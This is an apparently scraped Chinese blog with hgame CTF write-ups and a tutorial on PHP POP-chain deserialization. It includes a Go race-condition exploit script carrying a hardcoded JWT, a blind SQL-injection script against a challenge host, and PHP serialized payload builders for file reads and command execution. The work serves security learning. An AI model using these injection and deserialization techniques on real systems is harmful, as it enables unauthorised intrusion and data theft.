REVERSEcreakme3IDA有插件或者版本合适的话其实可以反汇编pcc的，这里属于是出题人失误了。题目用结构体数组保存了一组数据，其中第一个int为字符的ASCII码，第二个int为字符的顺序，使用猴子排序算法来对数据进行排序，如果排序成功就会输出flag。 我做的时候是自己试了试就排出来了，放个官方wp的脚本吧： 12345678910111213141516171819202122232425262728struct alpha&#123; int ch; int index;&#125;;struct alpha a[89] =&#123; &#123; 48, 20093 &#125;, &#123; 48, 26557 &#125;, &#123; 48, 31304 &#125;, &#123; 48, 33442 &#125;, &#123; 48, 37694&#125;, &#123; 49, 39960 &#125;, &#123; 50, 23295 &#125;, &#123; 50, 27863 &#125;, &#123; 50, 42698 &#125;, &#123; 50,48505 &#125;, &#123; 50, 52925 &#125;, &#123; 51, 12874 &#125;, &#123; 51, 12946 &#125;, &#123; 51, 14597 &#125;, &#123;51, 17041 &#125;, &#123; 51, 23262 &#125;, &#123; 51, 28319 &#125;, &#123; 51, 42282 &#125;, &#123; 51, 48693 &#125;,&#123; 51, 52067 &#125;, &#123; 53, 32571 &#125;, &#123; 56, 14612 &#125;, &#123; 56, 45741 &#125;, &#123; 57, 14554 &#125;,&#123; 57, 20048 &#125;, &#123; 57, 27138 &#125;, &#123; 57, 45327 &#125;, &#123; 66, 30949 &#125;, &#123; 95, 32502&#125;, &#123; 95, 35235 &#125;, &#123; 95, 36541 &#125;, &#123; 95, 38371 &#125;, &#123; 97, 29658 &#125;, &#123; 100,21388 &#125;, &#123; 100, 25403 &#125;, &#123; 100, 40604 &#125;, &#123; 100, 46987 &#125;, &#123; 100, 51302 &#125;,&#123; 101, 12974 &#125;, &#123; 101, 30329 &#125;, &#123; 102, 10983 &#125;, &#123; 102, 19818 &#125;, &#123; 102,22280 &#125;, &#123; 102, 26128 &#125;, &#123; 102, 41560 &#125;, &#123; 102, 47116 &#125;, &#123; 102, 51333 &#125;,&#123; 103, 28938 &#125;, &#123; 103, 31988 &#125;, &#123; 104, 16246 &#125;, &#123; 104, 28715 &#125;, &#123; 104,41966 &#125;, &#123; 104, 44368 &#125;, &#123; 104, 47815 &#125;, &#123; 105, 16420 &#125;, &#123; 105, 35362 &#125;,&#123; 105, 49237 &#125;, &#123; 106, 11090 &#125;, &#123; 106, 50823 &#125;, &#123; 107, 24320 &#125;, &#123; 107,50199 &#125;, &#123; 108, 24962 &#125;, &#123; 109, 30171 &#125;, &#123; 110, 15457 &#125;, &#123; 110, 18838 &#125;,&#123; 110, 24001 &#125;, &#123; 111, 11638 &#125;, &#123; 111, 32023 &#125;, &#123; 111, 43291 &#125;, &#123; 112,39661 &#125;, &#123; 114, 17872 &#125;, &#123; 114, 33895 &#125;, &#123; 114, 43869 &#125;, &#123; 115, 20611 &#125;,&#123; 115, 25122 &#125;, &#123; 115, 36243 &#125;, &#123; 115, 37434 &#125;, &#123; 115, 38686 &#125;, &#123; 115,46266 &#125;, &#123; 115, 51077 &#125;, &#123; 116, 13656 &#125;, &#123; 116, 34493 &#125;, &#123; 116, 38712 &#125;,&#123; 117, 14096 &#125;, &#123; 117, 38777 &#125;, &#123; 119, 12095 &#125;, &#123; 119, 17629 &#125;, &#123; 123,30945 &#125;, &#123; 125, 40770 &#125;&#125;;#include&lt;stdio.h&gt;int main()&#123; for(int i=0;i&lt;89;i++)&#123; for(int j=0;j&lt;89;j++)&#123; if(a[i].index&lt;a[j].index)&#123; struct alpha temp=a[i]; a[i]=a[j]; a[j]=temp; &#125; &#125; &#125; for(int i=0;i&lt;89;i++)&#123; putchar(a[i].ch); &#125;&#125;//fjow33etu938nhi3wrnf90sdf32nklsdf0923hgame&#123;B0go_50rt_is_s0_stup1d&#125;fh32orh98sdfh23ikjsdf32 flag:hgame{B0go_50rt_is_s0_stup1d} WEBSecurityCenter进入网页查看源码，发现提示install.json,查看后发现网页是twig模板： 测试后发现在跳转界面存在ssti注入，尝试构建twig的payload测试： 测试成功，接着获取flag文件就可以了，但是由于获取的内容不能存在hgame，因此要用base64的方式输出，接着解码得到flag： Vidar shop demo非预期进入网页注册账号后，发现余额为9999，但是购买flag需要10000。观察页面发现除了flag还可以购买一个20元的徽章，购买流程是先下订单，再付款，而且付款后可以退款。 尝试抓包后发现退款是只验证商品id的，因此我们先从订单，然后购买20元的徽章，接着退款并且改id，就可以发现我们退款了一个flag的价格： 最后购买flag，得到flag： 预期这题的实际考点是竞争上传，但是由于存在逻辑漏洞导致了非预期。 先查询出用户余额，然后创建订单，最后更新用户余额（余额值取自查询出的余额扣除订单金额）。整个过程持续了超过500ms（正常不会这么慢，特地sleep是为了方便做题）。所以假如在500ms内有同一个用户的多个不同订单的支付请求打进来，不妨假设查询到的用户余额都是100币（因为还没超过500ms，第一个请求还未更新用户余额），那么最终的结果是订单全部支付成功，但是用户的余额仅仅更新为了(100-最后一个订单金额)。最后再手动依次取消支付成功的订单，余额就会变多。 exp： 1234567891011121314151617181920212223type Ts struct &#123; Uid int `json:&quot;uid&quot;` Oid int `json:&quot;oid&quot;` Amount int `json:&quot;amount&quot;`&#125;func TestHgame(T *testing.T) &#123; var ts Ts ts.Uid = 1 ts.Oid = 7 ts.Amount = 5 go gorequest.New().Post(&quot;http://127.0.0.1:8003/apipay/create&quot;). Set(&quot;Authorization&quot;, &quot;bearereyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NDM3NTAyNjEsImlhdCI6MTY0MzY2Mzg2MSwidWlkIjoxfQ.b1QV-ubi277QQobG9sS-T4XKq0P78wGMlKZ3aQTFiNE&quot;). SendStruct(&amp;ts).End() var ts2 Ts ts2.Uid = 1 ts2.Oid = 8 ts2.Amount = 5 go gorequest.New().Post(&quot;http://127.0.0.1:8003/api/paycreate&quot;). Set(&quot;Authorization&quot;, &quot;bearereyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NDM3NTAyNjEsImlhdCI6MTY0MzY2Mzg2MSwidWlkIjoxfQ.b1QV-ubi277QQobG9sS-T4XKq0P78wGMlKZ3aQTFiNE&quot;). SendStruct(&amp;ts2).End() time.Sleep(5 * time.Second)&#125; LoginMe进网页直接给了test的账号密码，登陆发现需要admin的账号密码才能获取flag。还给了hint： 这题要用like模糊查询来进行sql注入，爆出密码，这里有一个坑点就是post时数据是以json上传的，刚开始注的时候忘记了这点导致一直失败，编写脚本： 123456789101112131415161718192021222324252627import requestsimport stringimport jsonstrs = string.printableurl = &quot;http://339a4b1eda.login.summ3r.top:60067/login&quot;s = requests.session()headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;if __name__ == &quot;__main__&quot;: name = &#x27;&#x27; for i in range(0,100): char = &#x27;&#x27; for j in strs: payload = f&quot;admin&#x27; and password like &#x27;&#123;name+j&#125;%&quot; data = &#123; &quot;username&quot;: payload, &quot;password&quot;: &quot;text&quot; &#125; r = s.post(url=url, data=json.dumps(data), headers=headers) if &quot;success&quot; in r.text: name += j print(j, end=&#x27;&#x27;) char = j break if char == &#x27;%&#x27;: break 爆出密码： 最后登录即可拿到flag：","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"pop链的构建","slug":"pop链的构建","date":"2022-02-09T08:04:47.000Z","updated":"2022-02-09T13:25:44.525Z","comments":true,"path":"2022/02/09/pop链的构建/","link":"","permalink":"http://example.com/2022/02/09/pop%E9%93%BE%E7%9A%84%E6%9E%84%E5%BB%BA/","excerpt":"前言 反序列化plus之pop链的构建，趁寒假还有点时间就继续学习下。","text":"前言 反序列化plus之pop链的构建，趁寒假还有点时间就继续学习下。 什么是pop链在反序列化中，我们能控制的数据就是对象中的属性值，所以在PHP反序列化中有一种漏洞利用方法叫”面向属性编程”，即POP(Property Oriented Programming)。 在利用反序列化漏洞时，漏洞的利用点有时候并不会在魔术方法中，而是存在于普通方法中，这时候我们就要构建pop来逐步跟进调用函数，直到找到利用点。 例题理解【极客大挑战2021】babyPOP回顾一下去年极客大挑战这道POP题，先看代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phpclass a &#123; public static $Do_u_like_JiaRan = false; public static $Do_u_like_AFKL = false;&#125;class b &#123; private $i_want_2_listen_2_MaoZhongDu; public function __construct() &#123; $this-&gt;i_want_2_listen_2_MaoZhongDu; &#125; public function __toString() &#123; if (a::$Do_u_like_AFKL) &#123; return exec($this-&gt;i_want_2_listen_2_MaoZhongDu); &#125; else &#123; throw new Error(&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;); &#125; &#125;&#125;class c &#123; public $b; public function __wakeup() &#123; a::$Do_u_like_JiaRan = true; &#125;&#125;class d &#123; public $value; public function __invoke() &#123; a::$Do_u_like_AFKL = true; return &quot;关注嘉然,&quot; . $this-&gt;value; &#125;&#125;class e &#123; public $afkl; public function __destruct() &#123; if (a::$Do_u_like_JiaRan) &#123; ($this-&gt;afkl)(); &#125; else &#123; throw new Error(&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;); &#125; &#125;&#125; 审计代码，类a中定义了两个静态变量，均为flase，接着看利用点在类b的exec函数中，而要利用这个函数需要满足$Do_u_like_AFKL为true，因此定位到类d，而__invoke方法需要使用调用函数的方式调用一个对象，因此定位到类e，发现需要$Do_u_like_JiaRan为true才可以，最后定位到类c。 理清逻辑后，我们发现c与e之间没有直接的桥梁，因此我们需要自定义变量连接两者，构建payload： 123456789$c=new c();$e=new e();$d=new d();$b=new b();$b-&gt;i_want_2_listen_2_MaoZhongDu=&quot;xxxxxxx&quot;;$d-&gt;value=$b;$e-&gt;afkl=$d;$c-&gt;b=$e;echo base64_encode(serialize($c)); 这题利用反弹shell原理对b赋值即可。 [MRCTF2020]Ezpop这是一道比较经典的pop链的题目，很适合做参考。 源代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253 &lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier &#123; protected $var; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file=&#x27;index.php&#x27;)&#123; $this-&gt;source = $file; echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;; &#125; public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = array(); &#125; public function __get($key)&#123; $function = $this-&gt;p; return $function(); &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123; @unserialize($_GET[&#x27;pop&#x27;]);&#125;else&#123; $a=new Show; highlight_file(__FILE__);&#125; 同样审计代码进行分析，首先找到利用点，发现类Modifier中存在include函数，确认这里为利用点。接着发现我们想要执行这个利用点，就需要调用append这个方法，而要调用这个方法就需要触发__invoke方法，因此我们需要传入var的值。 而要触发__invoke方法，则需要类Test中的属性$p，但是要调用__get方法才可以，而调用__get方法则需要给在类Show中的str赋值类Test的对象，由于类Test中没有属性$source所以可以调用。因此，我们需要调用__toString方法，而要调用这个方法需要类Show的对象被当成字符串操作，因此要利用__wakeup方法，这个方法中$source属性被当成字符串去比较。 逻辑整理完，构建payload： 12345678910111213141516171819202122232425&lt;?phpclass Modifier &#123; protected $var=&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;&#125;class Show&#123; public $source; public $str; public function __construct($file)&#123; $this-&gt;source = $file; &#125; public function __toString()&#123; return &quot;&quot;; &#125;&#125;class Test&#123; public $p;&#125;$a = new Show(&#x27;a&#x27;);$a -&gt; str = new Test();$a -&gt; str -&gt; p = new Modifier();$b = new Show($a);echo urlencode(serialize($b)); 最后传参即可得到flag。 魔术方法总结魔术方法这块在之前的博客也简单提到了，由于pop链的构造整个机制对魔术方法的运用还是有一定要求的，这里就再复习下： __construct()，类的构造函数 __destruct()，类的析构函数 __call()，在对象中调用一个不可访问方法时调用 __callStatic()，用静态方式中调用一个不可访问方法时调用 __get()，获得一个类的成员变量时调用 __set()，设置一个类的成员变量时调用 __isset()，当对不可访问属性调用isset()或empty()时调用 __unset()，当对不可访问属性调用unset()时被调用。 __sleep()，执行serialize()时，先会调用这个函数 __wakeup()，执行unserialize()时，先会调用这个函数 __toString()，类被当成字符串时的回应方法 __invoke()，调用函数的方式调用一个对象时的回应方法 __set_state()，调用var_export()导出类时，此静态方法会被调用。 __clone()，当对象复制完成时调用 __autoload()，尝试加载未定义的类 __debugInfo()，打印所需调试信息 具体分析参考下面这几篇博客：PHP之十六个魔术方法详解PHP反序列化和魔术方法 总结pop链的构建还是具有一定难度的，对链条的逻辑需要有准确的判断，还是需要做一些练习来巩固的。还剩原生方法那一块没看，之后找个时间稍微学下。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -php","slug":"web-php","permalink":"http://example.com/tags/web-php/"}]},{"title":"【hgame week2】write up","slug":"【hgame-week2】write-up","date":"2022-02-04T12:12:48.000Z","updated":"2022-02-05T11:22:48.669Z","comments":true,"path":"2022/02/04/【hgame-week2】write-up/","link":"","permalink":"http://example.com/2022/02/04/%E3%80%90hgame-week2%E3%80%91write-up/","excerpt":"前言第二周果然麻中麻，密码和xss把我折磨了，这里直接预告下周摆烂。","text":"前言第二周果然麻中麻，密码和xss把我折磨了，这里直接预告下周摆烂。 CRYPTORSA Attack这题的RSA比较简单，n可以直接在线分解，把n分解后直接跑脚本就可以了。 脚本： 123456789101112import libnumflag = &#x27;&#x27;p = 715800347513314032483037q = 978782023871716954857211e = 65537c = 122622425510870177715177368049049966519567512708n = p*qphi = (p-1)*(q-1)d = libnum.invmod(e,phi)flag = libnum.n2s(pow(c,d,n))print(flag) Chinese Character Encryption这题真的麻中麻，做的时候心态都崩了。根据提示，加密方式只与拼音有关，并且声调单独加密。这里我分析了半天终于分析出来加密逻辑了： 首先将拼音的所有字母对应的数字相加，比如chao就是3+8+1+15=27；接着再看有几个字母，如果是两个就+64，三个+32，四个不变，五个-32，六个-64；再然后看声调，一声+49，二声+50，三声+51，四声+52场，轻声不变。最后得出来的这个值即为字符串的ascii码值。 根据上述逻辑，编写脚本（实力不行只能写出这种烂脚本了）： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from pypinyin import lazy_pinyin,Stylefrom libnum import n2s,s2nstyle = Style.TONE3a = lazy_pinyin(&#x27;陉萏俦蘭貑謠祥冄剏髯簧凰蕆秉僦笆鼣雔耿睺渺仦殣櫤鄽偟壮褃劳充迧蝔镁樷萾懴雈踺猳钔緲螩蝒醢徣纒漐&#x27;,style=style)print(a)flag = &#x27;&#x27;str = 0for i in range(0,47): b = list(a[i]) for j in range(0,10): c = len(b) if(j&lt;c-1): str += s2n(b[j]) - 96 else: if(b[j]==&#x27;1&#x27;): if(j==2): str += 64 if(j==3): str += 32 if(j==5): str -= 32 if(j==6): str -= 64 str += 49 flag += chr(str) str=0 break elif(b[j]==&#x27;2&#x27;): if(j==2): str += 64 if(j==3): str += 32 if(j==5): str -= 32 if(j==6): str -= 64 str += 50 flag += chr(str) str=0 break elif(b[j]==&#x27;3&#x27;): if(j==2): str += 64 if(j==3): str += 32 if(j==5): str -= 32 if(j==6): str -= 64 str += 51 flag += chr(str) str=0 break elif(b[j]==&#x27;4&#x27;): if(j==2): str += 64 if(j==3): str += 32 if(j==5): str -= 32 if(j==6): str -= 64 str += 52 flag += chr(str) str=0 break else: if(j==2): str += 64 if(j==3): str += 32 if(j==5): str -= 32 if(j==6): str -= 64 str += s2n(b[j]) flag += chr(str) str=0 breakprint(flag) 得到flag： RSA Attack 2RSA多种考法的杂糅，一共三部分，先看源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import refrom math import ceilfrom Crypto.Util.number import getPrimefrom libnum import s2nfrom secret import flagflag_parts = list(map(s2n, re.findall(rf&quot;.&#123;&#123;,&#123;ceil(len(flag) / 3)&#125;&#125;&#125;&quot;, flag)))print(&quot;# task1&quot;)m = flag_parts[0]e = 65537p = getPrime(1024)q = getPrime(1024)r = getPrime(1024)n1 = p * qc1 = pow(m, e, n1)n2 = r * qc2 = pow(m, e, n2)print(&quot;e =&quot;, e)print(&quot;n1 =&quot;, n1)print(&quot;c1 =&quot;, c1)print(&quot;n2 =&quot;, n2)print(&quot;c2 =&quot;, c2)print(&quot;# task2&quot;)m = flag_parts[1]e = 7p = getPrime(1024)q = getPrime(1024)n = p * qc = pow(m, e, n)print(&quot;e =&quot;, e)print(&quot;n =&quot;, n)print(&quot;c =&quot;, c)print(&quot;# task3&quot;)m = flag_parts[2]p = getPrime(1024)q = getPrime(1024)n = p * qe1 = getPrime(32)e2 = getPrime(32)c1 = pow(m, e1, n)c2 = pow(m, e2, n)print(&quot;n =&quot;, n)print(&quot;e1 =&quot;, e1)print(&quot;c1 =&quot;, c1)print(&quot;e2 =&quot;, e2)print(&quot;c2 =&quot;, c2) 首先是第一部分，可以发现n1、n2有共同的质数q，我们可以利用这一点计算出d，编写脚本： 1234567891011121314151617import libnumn1 = 14611545605107950827581005165327694782823188603151768169731431418361306231114985037775917461433925308054396970809690804073985835376464629860609710292181368600618626590498491850404503443414241455487304448344892337877422465715709154238653505141605904184985311873763495761345722155289457889686019746663293720106874227323699288277794292208957172446523420596391114891559537811029473150123641624108103676516754449492805126642552751278309634846777636042114135990516245907517377320190091400729277307636724890592155256437996566160995456743018225013851937593886086129131351582958811003596445806061492952513851932238563627194553n2 = 20937478725109983803079185450449616567464596961348727453817249035110047585580142823551289577145958127121586792878509386085178452171112455890429474457797219202827030884262273061334752493496797935346631509806685589179618367453992749753318273834113016237120686880514110415113673431170488958730203963489455418967544128619234394915820392908422974075932751838012185542968842691824203206517795693893863945100661940988455695923511777306566419373394091907349431686646485516325575494902682337518438042711296437513221448397034813099279203955535025939120139680604495486980765910892438284945450733375156933863150808369796830892363e1 = 65537c1 = 965075803554932988664271816439183802328812013694203741320763105376036912584995031647672348468111310423680858101990670067065306237596121664884353679987689532305437801346923070145524106271337770666947677115752724993307387122132705797012726237073550669419110046308257408484535063515678066777681017211510981429273346928022971149411064556225001287399141306136081722471075032423079692908380267160214143720516748000734987068685104675254411687005690312116824966036851568223828884335112144637268090397158532937141122654075952730052331573980701136378212002956719295192733955673315234274064519957670199895100508623561838510479c2 = 11536506945313747180442473461658912307154460869003392732178457643224057969838224601059836860883718459986003106970375778443725748607085620938787714081321315817144414115589952237492448483438910378865359239575169326116668030463275817609827626048962304593324479546453471881099976644410889657248346038986836461779780183411686260756776711720577053319504691373550107525296560936467435283812493396486678178020292433365898032597027338876045182743492831814175673834198345337514065596396477709839868387265840430322983945906464646824470437783271607499089791869398590557314713094674208261761299894705772513440948139429011425948090p1 = libnum.gcd(n1,n2)q1 = n1//p1phi1 = (p1-1)*(q1-1)d1 = libnum.invmod(e1,phi1)flag = libnum.n2s(pow(c1,d1,n1))print(flag) 得到第一部分flag： 接着第二部分，可以发现e值非常小，因此可以直接爆破出来，懒得写脚本就拿了份网上python2的来用： 12345678910# -*- coding: cp936 -*-import gmpy2e = 7# 读入 n, 密文n= 14157878492255346300993349653813018105991884577529909522555551468374307942096214964604172734381913051273745228293930832314483466922529240958994897697475939867025561348042725919663546949015024693952641936481841552751484604123097148071800416608762258562797116583678332832015617217745966495992049762530373531163821979627361200921544223578170718741348242012164115593777700903954409103110092921578821048933346893212805071682235575813724113978341592885957767377587492202740185970828629767501662195356276862585025913615910839679860669917255271734413865211340126544199760628445054131661484184876679626946360753009512634349537c= 10262871020519116406312674685238364023536657841034751572844570983750295909492149101500869806418603732181350082576447594766587572350246675445508931577670158295558641219582729345581697448231116318080456112516700717984731655900726388185866905989088504004805024490513718243036445638662260558477697146032055765285263446084259814560197549018044099935158351931885157616527235283229066145390964094929007056946332051364474528453970904251050605631514869007890625result = gmpy2.iroot(c, 7)if result[1]: print &#x27;&#123;:x&#125;&#x27;.format(result[0]).decode(&#x27;hex&#x27;) 跑出第二部分flag： 接着看第三部分，纯纯的共模加密，同样从网上扒来python2脚本： 123456789101112131415161718192021222324252627282930# -*- coding: cp936 -*-import gmpy2n = 18819509188106230363444813350468162056164434642729404632983082518225388069544777374544142317612858448345344137372222988033366528086236635213756227816610865045924357232188768913642158448603346330462535696121739622702200540344105464126695432011739181531217582949804939555720700457350512898322376591813135311921904580338340203569582681889243452495363849558955947124975293736509426400460083981078846138740050634906824438689712748324336878791622676974341814691041262280604277357889892211717124319329666052810029131172229930723477981468761369516771720250571713027972064974999802168017946274736383148001865929719248159075729e = [2519901323, 3676335737]c = [3230779726225544872531441169009307072073754578761888387983403206364548451496736513905460381907928107310030086346589351105809028599650303539607581407627819797944337398601400510560992462455048451326593993595089800150342999021874734748066692962362650540036002073748766509347649818139304363914083879918929873577706323599628031618641793074018304521243460487551364823299685052518852685706687800209505277426869140051056996242882132616256695188870782634310362973153766698286258946896866396670872451803114280846709572779780558482223393759475999103607704510618332253710503857561025613632592682931552228150171423846203875344870, 940818595622279161439836719641707846790294650888799822335007385854166736459283129434769062995122371073636785371800857633841379139761091890426137981113087519934854663776695944489430385663011713917022574342380155718317794204988626116362865144125136624722782309455452257758808172415884403909840651554485364309237853885251876941477098008690389600544398998669635962495989736021020715396415375890720335697504837045188626103142204474942751410819466379437091569610294575687793060945525108986660851277475079994466474859114092643797418927645726430175928247476884879817034346652560116597965191204061051401916282814886688467861]c1 = c[0]c2 = c[1]e1 = e[0]e2 = e[1]s = gmpy2.gcdext(e1, e2)s1 = s[1]s2 = s[2]if s1 &lt; 0: s1 = -s1 c1 = gmpy2.invert(c1, n)elif s2 &lt; 0: s2 = -s2 c2 = gmpy2.invert(c2, n)m = pow(c1, s1, n) * pow(c2, s2, n) % nprint &#x27;&#123;:x&#125;&#x27;.format(int(m)).decode(&#x27;hex&#x27;) 跑出第三部分flag： 最后组合flag：hgame{RsA@hAS!a&amp;VArIETY?of.AttacK^mEThodS^whAT:other!AttACK|METHOdS~do@you_KNOW} MISC奇妙小游戏同样很麻的一题，不过这题脑洞没前面密码那题大，一下午不到还是做出来了。nc连接后是一个迷宫图，还给了一个entry值，通过多次做错分析答案得出解法： 如图所示分列，entry即为起点列，从下往上行进，如果碰到横过来的部分就要通过那个部分前往另一列，然后继续上行，以此规则最后抵达哪一列的最上面答案就是那个数字。 得出解法后一直过关就可以了，不过容器给的时间是真的短： 一张怪怪的名片社工题，首先给了个二维码，拼接玩发现扫不出来，用qrazybox进行识别： 接着使用其中的关键字homeboyc，谷歌或者必应等搜索，找到博客： 接着翻阅博客，发现友链部分有一个自留地： 点击进去发现3篇博客，一篇是去年8月16日发布的鸿师傅庆祝女友19岁生日，一篇提示有一个弱密码并且含有一个信息，还有一篇博客直指flag： 根据博客内容，需要猜测弱密码并且进行PBKDF2将密码转化为key，猜了半天才猜出来密码是hgame20020816，接着解密就可以了： 你上当了 我的很大附件给了一个3点多G的压缩包，里面是压缩包套娃，应该套娃出来是四个二维码的，但是出题人失误放重复了，所以里面只有两个不同的二维码： 后面又放了剩下的两个二维码： 这四个二维码依次为Data Matrix、codablock F、Aztec、PDF147码，依次扫码得到四个base64码，四个base64码转换成四张图片，四张图片组合成一个QR码，扫描即可得到flag： 截图的时候要尽量截刚好，否则二维码可能会识别失败。 REVERSExD MAZE直接放伪代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586signed __int64 __fastcall sub_4015EC(__int64 a1, __int64 a2)&#123; __int64 v2; // rdx int v3; // ebx __int64 v4; // rdx unsigned int v5; // eax __int64 v6; // rsi __int64 v7; // rdx __int64 v8; // rax signed __int64 result; // rax bool v10; // al __int64 v11; // rax __int64 v12; // rax __int64 v13; // rax __int64 v14; // rax __int64 v15; // [rsp+20h] [rbp-30h] __int64 v16; // [rsp+28h] [rbp-28h] __int64 v17; // [rsp+30h] [rbp-20h] __int64 v18; // [rsp+38h] [rbp-18h] int v19; // [rsp+40h] [rbp-10h] int i; // [rsp+48h] [rbp-8h] int v21; // [rsp+4Ch] [rbp-4h] sub_401980(a1, (__int64 *)a2); v15 = 0LL; v16 = 0LL; v17 = 0LL; v18 = 0LL; v19 = 0; v21 = 0; ZStrsIcSt11char_traitsIcEERSt13basic_istreamIT_T0_ES6_PS3_(a1, a2, (__int64)&amp;v15, (__int64)&amp;ZSt3cin); v3 = sub_401550(a1, a2, v2, &amp;v15); v5 = sub_401550(a1, a2, v4, &quot;hgame&#123;&quot;); v6 = v5; if ( v3 != v5 + (unsigned int)sub_401550(a1, v5, v7, &quot;&#125;&quot;) + 28 ) &#123; v8 = ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(a1, v6, &quot;length err&quot;, &amp;ZSt4cout); ZNSolsEPFRSoS_E(a1, v6, ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_, v8); result = 1LL; &#125; else &#123; v10 = (unsigned int)sub_40158F(a1, v6, (__int64)&quot;hgame&#123;&quot;, (__int64)&amp;v15, 6) || BYTE2(v19) != 125; if ( v10 ) &#123; v11 = ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(a1, v6, &quot;Forbidden format&quot;, &amp;ZSt4cout); ZNSolsEPFRSoS_E(a1, v6, ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_, v11); result = 1LL; &#125; else &#123; for ( i = 6; i &lt;= 33; ++i ) &#123; switch ( *((_BYTE *)&amp;v15 + i) ) &#123; case 0x30: v21 += 512; break; case 0x31: v21 += 64; break; case 0x32: v21 += 8; break; case 0x33: ++v21; break; default: v12 = ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(a1, v6, &quot;Forbidden format&quot;, &amp;ZSt4cout); ZNSolsEPFRSoS_E(a1, v6, ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_, v12); return 1LL; &#125; if ( unk_404020[v21] != 32 || v21 &gt; 4095 ) &#123; v13 = ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(a1, v6, &quot;Failed&quot;, &amp;ZSt4cout); ZNSolsEPFRSoS_E(a1, v6, ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_, v13); return 1LL; &#125; &#125; v14 = ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(a1, v6, &quot;Win&quot;, &amp;ZSt4cout); ZNSolsEPFRSoS_E(a1, v6, ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_, v14); result = 0LL; &#125; &#125; return result;&#125; 逻辑还是很好理解的，读懂代码后我们发现flag就是由0,1,2,3这四个数字组成的，然后翻汇编我们可以发现后面有一排#号和空格交叉的伪字符串。v15是我们的flag，v21就是后面一排伪字符串的位置。根据空格之间差了几个#，对应着0,1,2,3，具体可以根据上面的伪代码判断。 然后因为我懒，就没写脚本了，直接手算了，得出flag： upx magic 0笑死，这题附件给错了，给了个脱壳后的文件，本来是不会脱壳的。同样先看伪代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960sub_40FAC0((unsigned __int64)&quot;%40s&quot;); if ( sub_4004E0((__int64)&amp;v41, (__int64)&amp;v41) != (signed __int64 (__usercall *)@&lt;rax&gt;(__int64@&lt;rax&gt;, unsigned __int64@&lt;rdi&gt;, __int128@&lt;xmm0&gt;, __m256i@&lt;ymm0&gt;))32 ) &#123; sub_40F940((unsigned __int64)&quot;length error&quot;); sub_40ED20(0LL); &#125; for ( i = 0; i &lt; (unsigned __int64)sub_4004E0((__int64)&amp;v41, (__int64)&amp;v41); ++i ) &#123; v6 = *((char *)&amp;v41 + i) &lt;&lt; 8; for ( j = 0; j &lt;= 7; ++j ) &#123; if ( v6 &amp; 0x8000 ) v6 = 2 * v6 ^ 0x1021; else v6 *= 2; &#125; v40[i] = (unsigned __int16)v6; &#125; v8 = 36200; v9 = 40265; v10 = 10770; v11 = 43802; v12 = 52188; v13 = 47403; v14 = 11826; v15 = 40793; v16 = 56781; v17 = 40265; v18 = 43274; v19 = 3696; v20 = 62927; v21 = 2640; v22 = 23285; v23 = 65439; v24 = 40793; v25 = 48395; v26 = 22757; v27 = 14371; v28 = 48923; v29 = 30887; v30 = 43802; v31 = 18628; v32 = 43274; v33 = 11298; v34 = 40793; v35 = 23749; v36 = 24277; v37 = 30887; v38 = 9842; v39 = 22165; if ( (unsigned int)sub_400490(v40, &amp;v8, 32LL) ) &#123; v0 = &quot;Wrong&quot;; sub_4107A0(&quot;Wrong&quot;); &#125; else &#123; v0 = &quot;Great,your input is flag&quot;; sub_4107A0(&quot;Great,your input is flag&quot;); &#125; 逻辑也不是很难，一个crc16加密逻辑，直接写脚本解出来就可以了： 123456789101112list = [0x8d68,0x9d49,0x2a12,0xab1a,0xcbdc,0xb92b,0x2e32,0x9f59,0xddcd,0x9d49,0xa90a,0xe70,0xf5cf,0xa50,0x5af5,0xff9f,0x9f59,0xbd0b,0x58e5,0x3823,0xBF1B,0x78a7,0xab1a,0x48c4,0xa90a,0x2c22,0x9f59,0x5cc5,0x5ed5,0x78a7,0x2672,0x5695]flag = &#x27;&#x27;for b in list: for i in range(0,8): if(b &amp; 1): b = (b ^ 0x1021) // 2 